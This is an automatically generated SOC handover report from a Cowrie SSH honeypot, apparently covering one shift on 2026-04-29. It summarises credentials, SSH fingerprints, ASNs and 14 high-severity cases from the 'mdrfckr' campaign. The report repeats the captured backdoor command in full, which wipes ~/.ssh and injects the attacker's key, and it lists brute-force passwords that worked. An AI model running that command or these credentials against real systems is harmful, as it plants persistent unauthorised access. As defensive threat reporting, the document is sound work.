# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-29 |
| **Generated At** | 2026-04-29T10:10:10Z |
| **Shift Time** | 10:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **278** |
| Confirmed Threats | **259** |
| False Positives Filtered | **19** (6.8%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **18** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **264** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 3 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **93** |
| Unique Credential Pairs | **71** |
| Unique Usernames | **40** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 14 |
| `root` | 14 |
| `345gs5662d34` | 7 |
| `admin` | 5 |
| `GET / HTTP/1.1` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `password` | 5 |
| `Host: 13.235.92.17:23` | 3 |
| `Accept-Encoding: gzip` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 3 |
| `*1` | `$4` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `server4you` | `221.156.126.1` | 2026-04-29T07:25:56 |
| `root` | `3245gs5662d34` | `221.156.126.1` | 2026-04-29T07:26:00 |
| `root` | `admin234` | `221.156.126.1` | 2026-04-29T07:27:50 |
| `root` | `ubuntu12` | `221.156.126.1` | 2026-04-29T07:41:59 |
| `root` | `ubuntu@123` | `221.156.126.1` | 2026-04-29T07:49:27 |
| `root` | `tests` | `190.181.25.210` | 2026-04-29T08:47:52 |
| `root` | `3245gs5662d34` | `190.181.25.210` | 2026-04-29T08:47:59 |
| `root` | `ccserver` | `190.181.25.210` | 2026-04-29T08:55:15 |
| `root` | `Qwerty01` | `36.93.144.67` | 2026-04-29T09:37:47 |
| `root` | `3245gs5662d34` | `36.93.144.67` | 2026-04-29T09:37:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **278** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 101 |
| OpenSSH | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 75 | 3 |
| `03a80b21afa8...` | Modern SSH client | 26 | 2 |
| `c118de82e19e...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 75 | 3 | libssh-based |
| `03a80b21afa8...` | libssh | 26 | 2 | Modern SSH client |
| `c118de82e19e...` | OpenSSH | 4 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `36.93.144.67`, `190.181.25.210`, `221.156.126.1`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **25** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS55836` | Reliance Jio Infocomm Limited | 5 | LOW |
| `AS265393` | FIRENET SERVIÇOS DE TELECOMUNICAÇÕES LTDA | 4 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 3 | LOW |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS12322` | Free SAS | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-658b1e03d33f

| Field | Detail |
|---|---|
| **Source IP** | `221.156.126[.]1` |
| **First Seen** | 2026-04-29 07:25 |
| **Last Seen** | 2026-04-29 07:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 07:25:56` | `cowrie.session.connect` |
| `2026-04-29 07:25:56` | `cowrie.client.version` |
| `2026-04-29 07:25:56` | `cowrie.client.kex` |
| `2026-04-29 07:25:56` | `cowrie.login.success` |
| `2026-04-29 07:25:57` | `cowrie.session.params` |
| `2026-04-29 07:25:57` | `cowrie.command.input` |
| `2026-04-29 07:25:57` | `cowrie.command.failed` |
| `2026-04-29 07:25:57` | `cowrie.log.closed` |
| `2026-04-29 07:25:57` | `cowrie.session.params` |
| `2026-04-29 07:25:57` | `cowrie.command.input` |
| `2026-04-29 07:25:57` | `cowrie.session.file_download` |
| `2026-04-29 07:25:57` | `cowrie.log.closed` |
| `2026-04-29 07:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.156.126[.]1` to AbuseIPDB if not already reported
- [ ] Block `221.156.126[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01a11d56b710

| Field | Detail |
|---|---|
| **Source IP** | `221.156.126[.]1` |
| **First Seen** | 2026-04-29 07:25 |
| **Last Seen** | 2026-04-29 07:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 07:25:59` | `cowrie.session.connect` |
| `2026-04-29 07:25:59` | `cowrie.client.version` |
| `2026-04-29 07:26:00` | `cowrie.client.kex` |
| `2026-04-29 07:26:00` | `cowrie.login.success` |
| `2026-04-29 07:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.156.126[.]1` to AbuseIPDB if not already reported
- [ ] Block `221.156.126[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a07e59d93d

| Field | Detail |
|---|---|
| **Source IP** | `221.156.126[.]1` |
| **First Seen** | 2026-04-29 07:27 |
| **Last Seen** | 2026-04-29 07:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 07:27:49` | `cowrie.session.connect` |
| `2026-04-29 07:27:49` | `cowrie.client.version` |
| `2026-04-29 07:27:49` | `cowrie.client.kex` |
| `2026-04-29 07:27:50` | `cowrie.login.success` |
| `2026-04-29 07:27:50` | `cowrie.session.params` |
| `2026-04-29 07:27:50` | `cowrie.command.input` |
| `2026-04-29 07:27:50` | `cowrie.command.failed` |
| `2026-04-29 07:27:50` | `cowrie.log.closed` |
| `2026-04-29 07:27:51` | `cowrie.session.params` |
| `2026-04-29 07:27:51` | `cowrie.command.input` |
| `2026-04-29 07:27:51` | `cowrie.session.file_download` |
| `2026-04-29 07:27:51` | `cowrie.log.closed` |
| `2026-04-29 07:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.156.126[.]1` to AbuseIPDB if not already reported
- [ ] Block `221.156.126[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5fc4eeb59d1

| Field | Detail |
|---|---|
| **Source IP** | `221.156.126[.]1` |
| **First Seen** | 2026-04-29 07:27 |
| **Last Seen** | 2026-04-29 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 07:27:53` | `cowrie.session.connect` |
| `2026-04-29 07:27:53` | `cowrie.client.version` |
| `2026-04-29 07:27:53` | `cowrie.client.kex` |
| `2026-04-29 07:27:54` | `cowrie.login.success` |
| `2026-04-29 07:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.156.126[.]1` to AbuseIPDB if not already reported
- [ ] Block `221.156.126[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f388191ed273

| Field | Detail |
|---|---|
| **Source IP** | `221.156.126[.]1` |
| **First Seen** | 2026-04-29 07:41 |
| **Last Seen** | 2026-04-29 07:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 07:41:58` | `cowrie.session.connect` |
| `2026-04-29 07:41:58` | `cowrie.client.version` |
| `2026-04-29 07:41:58` | `cowrie.client.kex` |
| `2026-04-29 07:41:59` | `cowrie.login.success` |
| `2026-04-29 07:41:59` | `cowrie.session.params` |
| `2026-04-29 07:41:59` | `cowrie.command.input` |
| `2026-04-29 07:41:59` | `cowrie.command.failed` |
| `2026-04-29 07:41:59` | `cowrie.log.closed` |
| `2026-04-29 07:41:59` | `cowrie.session.params` |
| `2026-04-29 07:41:59` | `cowrie.command.input` |
| `2026-04-29 07:42:00` | `cowrie.session.file_download` |
| `2026-04-29 07:42:00` | `cowrie.log.closed` |
| `2026-04-29 07:42:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.156.126[.]1` to AbuseIPDB if not already reported
- [ ] Block `221.156.126[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9374380f7b44

| Field | Detail |
|---|---|
| **Source IP** | `221.156.126[.]1` |
| **First Seen** | 2026-04-29 07:42 |
| **Last Seen** | 2026-04-29 07:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 07:42:02` | `cowrie.session.connect` |
| `2026-04-29 07:42:02` | `cowrie.client.version` |
| `2026-04-29 07:42:02` | `cowrie.client.kex` |
| `2026-04-29 07:42:02` | `cowrie.login.success` |
| `2026-04-29 07:42:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.156.126[.]1` to AbuseIPDB if not already reported
- [ ] Block `221.156.126[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-027262f47cf1

| Field | Detail |
|---|---|
| **Source IP** | `221.156.126[.]1` |
| **First Seen** | 2026-04-29 07:49 |
| **Last Seen** | 2026-04-29 07:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 07:49:26` | `cowrie.session.connect` |
| `2026-04-29 07:49:26` | `cowrie.client.version` |
| `2026-04-29 07:49:26` | `cowrie.client.kex` |
| `2026-04-29 07:49:27` | `cowrie.login.success` |
| `2026-04-29 07:49:27` | `cowrie.session.params` |
| `2026-04-29 07:49:27` | `cowrie.command.input` |
| `2026-04-29 07:49:27` | `cowrie.command.failed` |
| `2026-04-29 07:49:27` | `cowrie.log.closed` |
| `2026-04-29 07:49:27` | `cowrie.session.params` |
| `2026-04-29 07:49:27` | `cowrie.command.input` |
| `2026-04-29 07:49:27` | `cowrie.session.file_download` |
| `2026-04-29 07:49:27` | `cowrie.log.closed` |
| `2026-04-29 07:49:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.156.126[.]1` to AbuseIPDB if not already reported
- [ ] Block `221.156.126[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb0ffce709c2

| Field | Detail |
|---|---|
| **Source IP** | `221.156.126[.]1` |
| **First Seen** | 2026-04-29 07:49 |
| **Last Seen** | 2026-04-29 07:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 07:49:30` | `cowrie.session.connect` |
| `2026-04-29 07:49:30` | `cowrie.client.version` |
| `2026-04-29 07:49:30` | `cowrie.client.kex` |
| `2026-04-29 07:49:30` | `cowrie.login.success` |
| `2026-04-29 07:49:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.156.126[.]1` to AbuseIPDB if not already reported
- [ ] Block `221.156.126[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dad6075da0f3

| Field | Detail |
|---|---|
| **Source IP** | `190.181.25[.]210` |
| **First Seen** | 2026-04-29 08:47 |
| **Last Seen** | 2026-04-29 08:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 08:47:50` | `cowrie.session.connect` |
| `2026-04-29 08:47:50` | `cowrie.client.version` |
| `2026-04-29 08:47:50` | `cowrie.client.kex` |
| `2026-04-29 08:47:52` | `cowrie.login.success` |
| `2026-04-29 08:47:52` | `cowrie.session.params` |
| `2026-04-29 08:47:52` | `cowrie.command.input` |
| `2026-04-29 08:47:52` | `cowrie.command.failed` |
| `2026-04-29 08:47:53` | `cowrie.log.closed` |
| `2026-04-29 08:47:53` | `cowrie.session.params` |
| `2026-04-29 08:47:53` | `cowrie.command.input` |
| `2026-04-29 08:47:54` | `cowrie.session.file_download` |
| `2026-04-29 08:47:54` | `cowrie.log.closed` |
| `2026-04-29 08:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.25[.]210` to AbuseIPDB if not already reported
- [ ] Block `190.181.25[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba507ee0ff34

| Field | Detail |
|---|---|
| **Source IP** | `190.181.25[.]210` |
| **First Seen** | 2026-04-29 08:47 |
| **Last Seen** | 2026-04-29 08:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 08:47:57` | `cowrie.session.connect` |
| `2026-04-29 08:47:57` | `cowrie.client.version` |
| `2026-04-29 08:47:58` | `cowrie.client.kex` |
| `2026-04-29 08:47:59` | `cowrie.login.success` |
| `2026-04-29 08:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.25[.]210` to AbuseIPDB if not already reported
- [ ] Block `190.181.25[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-988d00ad8776

| Field | Detail |
|---|---|
| **Source IP** | `190.181.25[.]210` |
| **First Seen** | 2026-04-29 08:55 |
| **Last Seen** | 2026-04-29 08:55 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 08:55:13` | `cowrie.session.connect` |
| `2026-04-29 08:55:13` | `cowrie.client.version` |
| `2026-04-29 08:55:14` | `cowrie.client.kex` |
| `2026-04-29 08:55:15` | `cowrie.login.success` |
| `2026-04-29 08:55:16` | `cowrie.session.params` |
| `2026-04-29 08:55:16` | `cowrie.command.input` |
| `2026-04-29 08:55:16` | `cowrie.command.failed` |
| `2026-04-29 08:55:16` | `cowrie.log.closed` |
| `2026-04-29 08:55:17` | `cowrie.session.params` |
| `2026-04-29 08:55:17` | `cowrie.command.input` |
| `2026-04-29 08:55:17` | `cowrie.session.file_download` |
| `2026-04-29 08:55:17` | `cowrie.log.closed` |
| `2026-04-29 08:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.25[.]210` to AbuseIPDB if not already reported
- [ ] Block `190.181.25[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2708251bccc9

| Field | Detail |
|---|---|
| **Source IP** | `190.181.25[.]210` |
| **First Seen** | 2026-04-29 08:55 |
| **Last Seen** | 2026-04-29 08:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 08:55:22` | `cowrie.session.connect` |
| `2026-04-29 08:55:22` | `cowrie.client.version` |
| `2026-04-29 08:55:22` | `cowrie.client.kex` |
| `2026-04-29 08:55:24` | `cowrie.login.success` |
| `2026-04-29 08:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.25[.]210` to AbuseIPDB if not already reported
- [ ] Block `190.181.25[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da4027619415

| Field | Detail |
|---|---|
| **Source IP** | `36.93.144[.]67` |
| **First Seen** | 2026-04-29 09:37 |
| **Last Seen** | 2026-04-29 09:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 09:37:46` | `cowrie.session.connect` |
| `2026-04-29 09:37:46` | `cowrie.client.version` |
| `2026-04-29 09:37:46` | `cowrie.client.kex` |
| `2026-04-29 09:37:47` | `cowrie.login.success` |
| `2026-04-29 09:37:47` | `cowrie.session.params` |
| `2026-04-29 09:37:47` | `cowrie.command.input` |
| `2026-04-29 09:37:47` | `cowrie.command.failed` |
| `2026-04-29 09:37:47` | `cowrie.log.closed` |
| `2026-04-29 09:37:47` | `cowrie.session.params` |
| `2026-04-29 09:37:47` | `cowrie.command.input` |
| `2026-04-29 09:37:47` | `cowrie.session.file_download` |
| `2026-04-29 09:37:47` | `cowrie.log.closed` |
| `2026-04-29 09:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.144[.]67` to AbuseIPDB if not already reported
- [ ] Block `36.93.144[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
